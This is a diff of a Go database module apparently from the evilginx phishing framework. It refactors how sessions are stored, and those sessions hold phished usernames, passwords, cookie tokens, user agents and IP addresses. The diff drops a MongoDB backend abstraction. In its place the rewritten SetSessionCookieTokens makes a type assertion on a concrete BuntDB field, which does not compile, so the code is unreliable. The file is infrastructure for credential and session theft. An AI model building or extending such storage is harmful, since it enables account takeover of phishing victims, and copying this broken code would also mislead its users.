@@ -10,79 +10,102 @@ import (
 type Database struct {
 	path string
 	db   *buntdb.DB
-	impl IDatabase
 }
 
 func NewDatabase(path string) (*Database, error) {
 	var err error
-	d := &Database{path: path}
-
-	if len(path) > 8 && path[:8] == "mongo://" {
-		mongoUri := path
-		mongoDb, err := NewMongoDatabase(mongoUri, "evilginx")
-		if err != nil {
-			return nil, err
-		}
-		d.impl = mongoDb
-		return d, nil
-	} else {
-		d.db, err = buntdb.Open(path)
-		if err != nil {
-			return nil, err
-		}
-		d.sessionsInit()
-		d.db.Shrink()
-		d.impl = (*BuntDatabase)(d)
-		return d, nil
+	d := &Database{
+		path: path,
 	}
+
+	d.db, err = buntdb.Open(path)
+	if err != nil {
+		return nil, err
+	}
+
+	d.sessionsInit()
+
+	d.db.Shrink()
+	return d, nil
 }
 
 func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
-	return d.impl.CreateSession(sid, phishlet, landing_url, useragent, remote_addr)
+	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
+	return err
 }
 
 func (d *Database) ListSessions() ([]*Session, error) {
-	return d.impl.ListSessions()
+	s, err := d.sessionsList()
+	return s, err
 }
 
 func (d *Database) SetSessionUsername(sid string, username string) error {
-	return d.impl.SetSessionUsername(sid, username)
+	err := d.sessionsUpdateUsername(sid, username)
+	return err
 }
 
 func (d *Database) SetSessionPassword(sid string, password string) error {
-	return d.impl.SetSessionPassword(sid, password)
+	err := d.sessionsUpdatePassword(sid, password)
+	return err
 }
 
 func (d *Database) SetSessionCustom(sid string, name string, value string) error {
-	return d.impl.SetSessionCustom(sid, name, value)
+	err := d.sessionsUpdateCustom(sid, name, value)
+	return err
 }
 
 func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
-	return d.impl.SetSessionBodyTokens(sid, tokens)
+	err := d.sessionsUpdateBodyTokens(sid, tokens)
+	return err
 }
 
 func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
-	return d.impl.SetSessionHttpTokens(sid, tokens)
+	err := d.sessionsUpdateHttpTokens(sid, tokens)
+	return err
 }
 
 func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
-	return d.impl.SetSessionCookieTokens(sid, tokens, bodyTokens, httpTokens)
+	var err1, err2 error
+
+	// MongoDB
+	if mongoDb, ok := d.db.(*MongoDatabase); ok {
+		err1 = mongoDb.SetSessionCookieTokens(sid, tokens, bodyTokens, httpTokens)
+	}
+
+	// BuntDB
+	err2 = d.sessionsUpdateCookieTokens(sid, tokens)
+
+	if err1 != nil {
+		return err1
+	}
+	return err2
 }
 
 func (d *Database) SetSessionCountryInfo(sid string, countryCode string, country string) error {
-	return d.impl.SetSessionCountryInfo(sid, countryCode, country)
+	err := d.sessionsUpdateCountryInfo(sid, countryCode, country)
+	return err
 }
 
 func (d *Database) DeleteSession(sid string) error {
-	return d.impl.DeleteSession(sid)
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	err = d.sessionsDelete(s.Id)
+	return err
 }
 
 func (d *Database) DeleteSessionById(id int) error {
-	return d.impl.DeleteSessionById(id)
+	_, err := d.sessionsGetById(id)
+	if err != nil {
+		return err
+	}
+	err = d.sessionsDelete(id)
+	return err
 }
 
 func (d *Database) Flush() {
-	d.impl.Flush()
+	d.db.Shrink()
 }
 
 func (d *Database) genIndex(table_name string, id int) string {
@@ -127,86 +150,16 @@ func (d *Database) getPivot(t interface{}) string {
 }
 
 func (d *Database) Close() error {
-	return d.impl.Close()
-}
-
-func (d *Database) GetSessionById(id int) (*Session, error) {
-	return d.impl.GetSessionById(id)
-}
-
-func (d *Database) GetSessionBySid(sid string) (*Session, error) {
-	return d.impl.GetSessionBySid(sid)
-}
-
-type BuntDatabase Database
-
-func (b *BuntDatabase) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
-	return (*Database)(b).sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
-}
-
-func (b *BuntDatabase) ListSessions() ([]*Session, error) {
-	return (*Database)(b).sessionsList()
-}
-
-func (b *BuntDatabase) SetSessionUsername(sid string, username string) error {
-	return (*Database)(b).sessionsUpdateUsername(sid, username)
-}
-
-func (b *BuntDatabase) SetSessionPassword(sid string, password string) error {
-	return (*Database)(b).sessionsUpdatePassword(sid, password)
-}
-
-func (b *BuntDatabase) SetSessionCustom(sid string, name string, value string) error {
-	return (*Database)(b).sessionsUpdateCustom(sid, name, value)
-}
-
-func (b *BuntDatabase) SetSessionBodyTokens(sid string, tokens map[string]string) error {
-	return (*Database)(b).sessionsUpdateBodyTokens(sid, tokens)
-}
-
-func (b *BuntDatabase) SetSessionHttpTokens(sid string, tokens map[string]string) error {
-	return (*Database)(b).sessionsUpdateHttpTokens(sid, tokens)
-}
-
-func (b *BuntDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
-	return (*Database)(b).sessionsUpdateCookieTokens(sid, tokens)
-}
-
-func (b *BuntDatabase) SetSessionCountryInfo(sid string, countryCode string, country string) error {
-	return (*Database)(b).sessionsUpdateCountryInfo(sid, countryCode, country)
-}
-
-func (b *BuntDatabase) DeleteSession(sid string) error {
-	s, err := (*Database)(b).sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	return (*Database)(b).sessionsDelete(s.Id)
-}
-
-func (b *BuntDatabase) DeleteSessionById(id int) error {
-	_, err := (*Database)(b).sessionsGetById(id)
-	if err != nil {
-		return err
-	}
-	return (*Database)(b).sessionsDelete(id)
-}
-
-func (b *BuntDatabase) Flush() {
-	(*Database)(b).db.Shrink()
-}
-
-func (b *BuntDatabase) Close() error {
-	if (*Database)(b).db != nil {
-		return (*Database)(b).db.Close()
+	if d.db != nil {
+		return d.db.Close()
 	}
 	return nil
 }
 
-func (b *BuntDatabase) GetSessionById(id int) (*Session, error) {
-	return (*Database)(b).sessionsGetById(id)
+func (d *Database) GetSessionById(id int) (*Session, error) {
+	return d.sessionsGetById(id)
 }
 
-func (b *BuntDatabase) GetSessionBySid(sid string) (*Session, error) {
-	return (*Database)(b).sessionsGetBySid(sid)
+func (d *Database) GetSessionBySid(sid string) (*Session, error) {
+	return d.sessionsGetBySid(sid)
 }
